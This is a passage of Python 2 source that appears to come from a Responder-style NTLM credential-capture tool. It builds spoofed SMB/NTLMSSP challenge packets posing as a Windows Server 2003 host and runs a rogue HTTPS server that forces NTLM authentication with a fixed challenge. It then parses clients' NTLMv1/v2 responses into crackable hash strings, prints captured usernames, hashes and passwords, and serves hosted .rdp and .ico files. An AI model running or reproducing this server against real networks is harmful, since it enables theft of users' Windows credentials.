        ("NegTokenASNLen",            "\x4f"),
        ("NegTokenTag0ASNId",         "\xA0"),
        ("NegTokenTag0ASNLen",        "\x30"),
        ("NegThisMechASNId",          "\x30"),
        ("NegThisMechASNLen",         "\x2e"),
        ("NegThisMech1ASNId",         "\x06"),
        ("NegThisMech1ASNLen",        "\x09"),
        ("NegThisMech1ASNStr",        "\x2a\x86\x48\x82\xf7\x12\x01\x02\x02"),
        ("NegThisMech2ASNId",         "\x06"),
        ("NegThisMech2ASNLen",        "\x09"),
        ("NegThisMech2ASNStr",        "\x2a\x86\x48\x86\xf7\x12\x01\x02\x02"),
        ("NegThisMech3ASNId",         "\x06"),
        ("NegThisMech3ASNLen",        "\x0a"),
        ("NegThisMech3ASNStr",        "\x2a\x86\x48\x86\xf7\x12\x01\x02\x02\x03"),
        ("NegThisMech4ASNId",         "\x06"),
        ("NegThisMech4ASNLen",        "\x09"),
        ("NegThisMech4ASNStr",        "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("NegTokenTag3ASNId",         "\xA3"),
        ("NegTokenTag3ASNLen",        "\x1b"),
        ("NegHintASNId",              "\x30"),
        ("NegHintASNLen",             "\x19"),
        ("NegHintTag0ASNId",          "\xa0"),
        ("NegHintTag0ASNLen",         "\x17"),
        ("NegHintFinalASNId",         "\x1b"),
        ("NegHintFinalASNLen",        "\x15"),
        ("NegHintFinalASNStr",        "server2008$@SMB.LOCAL"),
    ])

    def calculate(self):
        CompleteBCCLen1 =  str(self.fields["Guid"])+str(self.fields["InitContextTokenASNId"])+str(self.fields["InitContextTokenASNLen"])+str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
        AsnLenStart = str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
        AsnLen2 = str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
        MechTypeLen = str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])
        Tag3Len = str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen1))
        self.fields["InitContextTokenASNLen"] = struct.pack("<B", len(AsnLenStart))
        self.fields["ThisMechASNLen"] = struct.pack("<B", len(str(self.fields["ThisMechASNStr"])))
        self.fields["SpNegoTokenASNLen"] = struct.pack("<B", len(AsnLen2))
        self.fields["NegTokenASNLen"] = struct.pack("<B", len(AsnLen2)-2)
        self.fields["NegTokenTag0ASNLen"] = struct.pack("<B", len(MechTypeLen))
        self.fields["NegThisMechASNLen"] = struct.pack("<B", len(MechTypeLen)-2)
        self.fields["NegThisMech1ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech1ASNStr"])))
        self.fields["NegThisMech2ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech2ASNStr"])))
        self.fields["NegThisMech3ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech3ASNStr"])))
        self.fields["NegThisMech4ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech4ASNStr"])))
        self.fields["NegTokenTag3ASNLen"] = struct.pack("<B", len(Tag3Len))
        self.fields["NegHintASNLen"] = struct.pack("<B", len(Tag3Len)-2)
        self.fields["NegHintFinalASNLen"] = struct.pack("<B", len(str(self.fields["NegHintFinalASNStr"])))

class SMBSession1Data(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x04"),
        ("AndXCommand",           "\xff"),
        ("Reserved",              "\x00"),
        ("Andxoffset",            "\x5f\x01"),
        ("Action",                "\x00\x00"),
        ("SecBlobLen",            "\xea\x00"),
        ("Bcc",                   "\x34\x01"),
        ("ChoiceTagASNId",        "\xa1"),
        ("ChoiceTagASNLenOfLen",  "\x81"),
        ("ChoiceTagASNIdLen",     "\x00"),
        ("NegTokenTagASNId",      "\x30"),
        ("NegTokenTagASNLenOfLen","\x81"),
        ("NegTokenTagASNIdLen",   "\x00"),
        ("Tag0ASNId",             "\xA0"),
        ("Tag0ASNIdLen",          "\x03"),
        ("NegoStateASNId",        "\x0A"),
        ("NegoStateASNLen",       "\x01"),
        ("NegoStateASNValue",     "\x01"),
        ("Tag1ASNId",             "\xA1"),
        ("Tag1ASNIdLen",          "\x0c"),
        ("Tag1ASNId2",            "\x06"),
        ("Tag1ASNId2Len",         "\x0A"),
        ("Tag1ASNId2Str",         "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("Tag2ASNId",             "\xA2"),
        ("Tag2ASNIdLenOfLen",     "\x81"),
        ("Tag2ASNIdLen",          "\xED"),
        ("Tag3ASNId",             "\x04"),
        ("Tag3ASNIdLenOfLen",     "\x81"),
        ("Tag3ASNIdLen",          "\xEA"),
        ("NTLMSSPSignature",      "NTLMSSP"),
        ("NTLMSSPSignatureNull",  "\x00"),
        ("NTLMSSPMessageType",    "\x02\x00\x00\x00"),
        ("NTLMSSPNtWorkstationLen","\x1e\x00"),
        ("NTLMSSPNtWorkstationMaxLen","\x1e\x00"),
        ("NTLMSSPNtWorkstationBuffOffset","\x38\x00\x00\x00"),
        ("NTLMSSPNtNegotiateFlags","\x15\x82\x89\xe2"),
        ("NTLMSSPNtServerChallenge","\x81\x22\x33\x34\x55\x46\xe7\x88"),
        ("NTLMSSPNtReserved","\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("NTLMSSPNtTargetInfoLen","\x94\x00"),
        ("NTLMSSPNtTargetInfoMaxLen","\x94\x00"),
        ("NTLMSSPNtTargetInfoBuffOffset","\x56\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionHigh","\x05"),
        ("NegTokenInitSeqMechMessageVersionLow","\x02"),
        ("NegTokenInitSeqMechMessageVersionBuilt","\xce\x0e"),
        ("NegTokenInitSeqMechMessageVersionReserved","\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionNTLMType","\x0f"),
        ("NTLMSSPNtWorkstationName","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairsId","\x02\x00"),
        ("NTLMSSPNTLMChallengeAVPairsLen","\x0a\x00"),
        ("NTLMSSPNTLMChallengeAVPairsUnicodeStr","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairs1Id","\x01\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1Len","\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1UnicodeStr","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairs2Id","\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2Len","\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2UnicodeStr","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairs3Id","\x03\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3Len","\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3UnicodeStr","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairs5Id","\x05\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5Len","\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5UnicodeStr","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairs6Id","\x00\x00"),
        ("NTLMSSPNTLMChallengeAVPairs6Len","\x00\x00"),
        ("NTLMSSPNTLMPadding",             ""),
        ("NativeOs","Windows Server 2003 3790 Service Pack 2"),
        ("NativeOsTerminator","\x00\x00"),
        ("NativeLAN", "Windows Server 2003 5.2"),
        ("NativeLANTerminator","\x00\x00"),
    ])


    def calculate(self):
        ###### Convert strings to Unicode
        self.fields["NTLMSSPNtWorkstationName"] = self.fields["NTLMSSPNtWorkstationName"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"].encode('utf-16le')
        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le')
        self.fields["NativeLAN"] = self.fields["NativeLAN"].encode('utf-16le')

        ###### SecBlobLen Calc:
        AsnLen = str(self.fields["ChoiceTagASNId"])+str(self.fields["ChoiceTagASNLenOfLen"])+str(self.fields["ChoiceTagASNIdLen"])+str(self.fields["NegTokenTagASNId"])+str(self.fields["NegTokenTagASNLenOfLen"])+str(self.fields["NegTokenTagASNIdLen"])+str(self.fields["Tag0ASNId"])+str(self.fields["Tag0ASNIdLen"])+str(self.fields["NegoStateASNId"])+str(self.fields["NegoStateASNLen"])+str(self.fields["NegoStateASNValue"])+str(self.fields["Tag1ASNId"])+str(self.fields["Tag1ASNIdLen"])+str(self.fields["Tag1ASNId2"])+str(self.fields["Tag1ASNId2Len"])+str(self.fields["Tag1ASNId2Str"])+str(self.fields["Tag2ASNId"])+str(self.fields["Tag2ASNIdLenOfLen"])+str(self.fields["Tag2ASNIdLen"])+str(self.fields["Tag3ASNId"])+str(self.fields["Tag3ASNIdLenOfLen"])+str(self.fields["Tag3ASNIdLen"])
        CalculateSecBlob = str(self.fields["NTLMSSPSignature"])+str(self.fields["NTLMSSPSignatureNull"])+str(self.fields["NTLMSSPMessageType"])+str(self.fields["NTLMSSPNtWorkstationLen"])+str(self.fields["NTLMSSPNtWorkstationMaxLen"])+str(self.fields["NTLMSSPNtWorkstationBuffOffset"])+str(self.fields["NTLMSSPNtNegotiateFlags"])+str(self.fields["NTLMSSPNtServerChallenge"])+str(self.fields["NTLMSSPNtReserved"])+str(self.fields["NTLMSSPNtTargetInfoLen"])+str(self.fields["NTLMSSPNtTargetInfoMaxLen"])+str(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])+str(self.fields["NTLMSSPNtWorkstationName"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])

        ###### Bcc len
        BccLen = AsnLen+CalculateSecBlob+str(self.fields["NTLMSSPNTLMPadding"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLAN"])+str(self.fields["NativeLANTerminator"])

        ###### SecBlobLen
        self.fields["SecBlobLen"] = struct.pack("<h", len(AsnLen+CalculateSecBlob))
        self.fields["Bcc"] = struct.pack("<h", len(BccLen))
        self.fields["ChoiceTagASNIdLen"] = struct.pack(">B", len(AsnLen+CalculateSecBlob)-3)
        self.fields["NegTokenTagASNIdLen"] = struct.pack(">B", len(AsnLen+CalculateSecBlob)-6)
        self.fields["Tag1ASNIdLen"] = struct.pack(">B", len(str(self.fields["Tag1ASNId2"])+str(self.fields["Tag1ASNId2Len"])+str(self.fields["Tag1ASNId2Str"])))
        self.fields["Tag1ASNId2Len"] = struct.pack(">B", len(str(self.fields["Tag1ASNId2Str"])))
        self.fields["Tag2ASNIdLen"] = struct.pack(">B", len(CalculateSecBlob+str(self.fields["Tag3ASNId"])+str(self.fields["Tag3ASNIdLenOfLen"])+str(self.fields["Tag3ASNIdLen"])))
        self.fields["Tag3ASNIdLen"] = struct.pack(">B", len(CalculateSecBlob))

        ###### Andxoffset calculation.
        CalculateCompletePacket = str(self.fields["Wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["Reserved"])+str(self.fields["Andxoffset"])+str(self.fields["Action"])+str(self.fields["SecBlobLen"])+str(self.fields["Bcc"])+BccLen
        self.fields["Andxoffset"] = struct.pack("<h", len(CalculateCompletePacket)+32)

        ###### Workstation Offset
        CalculateOffsetWorkstation = str(self.fields["NTLMSSPSignature"])+str(self.fields["NTLMSSPSignatureNull"])+str(self.fields["NTLMSSPMessageType"])+str(self.fields["NTLMSSPNtWorkstationLen"])+str(self.fields["NTLMSSPNtWorkstationMaxLen"])+str(self.fields["NTLMSSPNtWorkstationBuffOffset"])+str(self.fields["NTLMSSPNtNegotiateFlags"])+str(self.fields["NTLMSSPNtServerChallenge"])+str(self.fields["NTLMSSPNtReserved"])+str(self.fields["NTLMSSPNtTargetInfoLen"])+str(self.fields["NTLMSSPNtTargetInfoMaxLen"])+str(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])

        ###### AvPairs Offset
        CalculateLenAvpairs = str(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])

        ##### Workstation Offset Calculation:
        self.fields["NTLMSSPNtWorkstationBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation))
        self.fields["NTLMSSPNtWorkstationLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtWorkstationMaxLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))

        ##### IvPairs Offset Calculation:
        self.fields["NTLMSSPNtTargetInfoBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtTargetInfoLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        self.fields["NTLMSSPNtTargetInfoMaxLen"] = struct.pack("<h", len(CalculateLenAvpairs))

        ##### IvPair Calculation:
        self.fields["NTLMSSPNTLMChallengeAVPairs5Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs3Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs2Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs1Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairsLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])))



def text(txt):
    if os.name == 'nt':
        return txt
    return '\r' + re.sub(r'\[([^]]*)\]', "\033[1;34m[\\1]\033[0m", txt)

def SaveToDb(result):
    for k in [ 'module', 'type', 'client', 'hostname', 'user', 'cleartext', 'hash', 'fullhash' ]:
        if not k in result:
            result[k] = ''
    if len(result['client']):
        print text("[%s] %s Client   : %s" % (result['module'], result['type'], result['client']))
    if len(result['hostname']):
        print text("[%s] %s Hostname : %s" % (result['module'], result['type'], result['hostname']))
    if len(result['user']):
        print text("[%s] %s Username : %s" % (result['module'], result['type'], result['user']))
    
    # Bu order of priority, print cleartext, fullhash, or hash
    if len(result['cleartext']):
        print text("[%s] %s Password : %s" % (result['module'], result['type'], result['cleartext']))
    elif len(result['fullhash']):
        print text("[%s] %s Hash     : %s" % (result['module'], result['type'], result['fullhash']))
    elif len(result['hash']):
        print text("[%s] %s Hash     : %s" % (result['module'], result['type'], result['hash']))


# Parse NTLMv1/v2 hash.
def ParseHTTPHash(data, client):
    LMhashLen    = struct.unpack('<H',data[12:14])[0]
    LMhashOffset = struct.unpack('<H',data[16:18])[0]
    LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
    
    NthashLen    = struct.unpack('<H',data[20:22])[0]
    NthashOffset = struct.unpack('<H',data[24:26])[0]
    NTHash       = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
    
    UserLen      = struct.unpack('<H',data[36:38])[0]
    UserOffset   = struct.unpack('<H',data[40:42])[0]
    User         = data[UserOffset:UserOffset+UserLen].replace('\x00','')

    if NthashLen == 24:
        HostNameLen     = struct.unpack('<H',data[46:48])[0]
        HostNameOffset  = struct.unpack('<H',data[48:50])[0]
        HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
        WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, "1122334455667788")

        SaveToDb({
            'module': 'HTTP', 
            'type': 'NTLMv1', 
            'client': client, 
            'host': HostName, 
            'user': User, 
            'hash': LMHash+":"+NTHash, 
            'fullhash': WriteHash,
        })

    if NthashLen > 24:
        NthashLen      = 64
        DomainLen      = struct.unpack('<H',data[28:30])[0]
        DomainOffset   = struct.unpack('<H',data[32:34])[0]
        Domain         = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
        HostNameLen    = struct.unpack('<H',data[44:46])[0]
        HostNameOffset = struct.unpack('<H',data[48:50])[0]
        HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
        WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, "1122334455667788", NTHash[:32], NTHash[32:])

        SaveToDb({
            'module': 'HTTP', 
            'type': 'NTLMv2', 
            'client': client, 
            'host': HostName, 
            'user': Domain + '\\' + User,
            'hash': NTHash[:32] + ":" + NTHash[32:],
            'fullhash': WriteHash,
        })

def GrabCookie(data, host):
    Cookie = re.search(r'(Cookie:*.\=*)[^\r\n]*', data)

    if Cookie:
        Cookie = Cookie.group(0).replace('Cookie: ', '')
        return Cookie
    return False

def GrabHost(data, host):
    Host = re.search(r'(Host:*.\=*)[^\r\n]*', data)

    if Host:
        Host = Host.group(0).replace('Host: ', '')
        return Host
    return False

def GrabReferer(data, host):
    Referer = re.search(r'(Referer:*.\=*)[^\r\n]*', data)

    if Referer:
        Referer = Referer.group(0).replace('Referer: ', '')
        return Referer
    return False

def GrabURL(data, host):
    GET = re.findall(r'(?<=GET )[^HTTP]*', data)
    POST = re.findall(r'(?<=POST )[^HTTP]*', data)
    POSTDATA = re.findall(r'(?<=\r\n\r\n)[^*]*', data)


# Handle HTTP packet sequence.
def PacketSequence(data, client):
    global hostedFiles

    path = "/"

    searchObj = re.search( r'GET (.*) HTTP.*', data, re.M|re.I)
    if searchObj:
        path = searchObj.group(1)

    feedBody = hostedFiles["/"]

    if "GET / HTTP" in data:
        NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
        if NTLM_Auth:
            Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]

            if Packet_NTLM == "\x01":
                GrabURL(data, client)
                GrabReferer(data, client)
                GrabHost(data, client)
                GrabCookie(data, client)

                tmp = "1122334455667788"
                Challenge = ""
                for i in range(0, len(tmp),2):
                    Challenge += tmp[i:i+2].decode("hex")

                Buffer = NTLM_Challenge(ServerChallenge=Challenge)
                Buffer.calculate()

                Buffer_Ans = IIS_NTLM_Challenge_Ans()
                Buffer_Ans.calculate(str(Buffer))

                return str(Buffer_Ans)

            if Packet_NTLM == "\x03":
                NTLM_Auth = b64decode(''.join(NTLM_Auth))
                ParseHTTPHash(NTLM_Auth, client)

                Buffer = IIS_XML(Payload=feedBody)
                Buffer.calculate()
                return str(Buffer)

        else:
            Response = IIS_Auth_401_Ans()
            return str(Response)
    else:

        if path in hostedFiles:
            if ".ico" in path:
                Buffer = IIS_ICO(Payload=b64decode(hostedFiles[path]))
                Buffer.calculate()
                return str(Buffer)
            if ".rdp" in path:
                Buffer = IIS_RDP(Payload=hostedFiles[path])
                Buffer.calculate()
                return str(Buffer)
        else:
            Buffer = IIS_Auth_Granted(Payload="foo")
            Buffer.calculate()
            return str(Buffer)

# HTTPS Server class
class HTTPS(StreamRequestHandler):
    def setup(self):
        self.exchange = self.request
        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

    def handle(self):
        while True:
            try:
                data = self.exchange.recv(8092)
                self.exchange.settimeout(0.5)
                Buffer = PacketSequence(data,self.client_address[0])
                self.exchange.send(Buffer)
            except:
                pass

class ThreadingTCPServer(ThreadingMixIn, TCPServer):
    def server_bind(self):
        try:
            self.socket.setsockopt(socket.SOL_SOCKET, 25, "0.0.0.0"+'\0')
        except:
            pass
        TCPServer.server_bind(self)

def serve_thread_SSL(host, port, handler, hosted, cert, key):
    global hostedFiles
    hostedFiles = hosted

    server = ThreadingTCPServer(("0.0.0.0", port), handler)
    server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
    server.serve_forever()

